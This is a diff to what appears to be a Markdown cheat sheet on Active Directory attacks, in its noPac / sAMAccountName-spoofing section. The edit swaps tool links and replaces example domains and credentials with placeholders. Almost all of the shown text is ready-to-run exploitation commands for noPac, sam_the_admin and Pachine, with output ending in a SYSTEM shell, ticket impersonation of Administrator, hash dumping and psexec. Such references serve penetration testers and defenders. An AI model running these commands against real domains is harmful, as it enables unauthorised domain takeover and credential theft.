@@ -842,15 +842,19 @@ cme smb -u user -p password -d domain.local -M webdav [TARGET]
 
 Automated exploitation:
 
-* [noPac - @cube0x0](https://github.com/cube0x0/noPac)
+* [cube0x0/noPac](https://github.com/cube0x0/noPac) - Windows
     ```powershell
     noPac.exe scan -domain htb.local -user user -pass 'password123'
     noPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt
     noPac.exe -domain htb.local -user domain_user -pass "Password123!" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator
     ```
-* [sam_the_admin - @WazeHell](https://github.com/WazeHell/sam-the-admin)
+* [Ridter/noPac](https://github.com/Ridter/noPac) - Linux
+  ```ps1
+  python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump
+  ```
+* [WazeHell/sam-the-admin](https://github.com/WazeHell/sam-the-admin)
     ```ps1
-    $ python3 sam_the_admin.py "caltech/alice.cassie:Lee@tPass" -dc-ip 192.168.1.110 -shell
+    $ python3 sam_the_admin.py "domain/user:password" -dc-ip 10.10.10.10 -shell
     [*] Selected Target dc.caltech.white                                              
     [*] Total Domain Admins 11                                                        
     [*] will try to impersonat gaylene.dreddy                                         
@@ -871,15 +875,15 @@ Automated exploitation:
     C:\Windows\system32>whoami                                                        
     nt authority\system 
     ```
-* [Pachine - @ly4k](https://github.com/ly4k/Pachine)
+* [ly4k/Pachine](https://github.com/ly4k/Pachine)
     ```powershell
     usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]
                   [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]
                   [domain/]username[:password]
-    $ python3 pachine.py -dc-host dc.predator.local -scan 'predator.local/john:Passw0rd!'
-    $ python3 pachine.py -dc-host dc.predator.local -spn cifs/dc.predator.local -impersonate administrator 'predator.local/john:Passw0rd!'
-    $ export KRB5CCNAME=$PWD/administrator@predator.local.ccache
-    $ impacket-psexec -k -no-pass 'predator.local/administrator@dc.predator.local'
+    $ python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0rd!'
+    $ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impersonate administrator 'domain.local/john:Passw0rd!'
+    $ export KRB5CCNAME=$PWD/administrator@domain.local.ccache
+    $ impacket-psexec -k -no-pass 'domain.local/administrator@dc.domain.local'
     ```
 
 **Mitigations**:
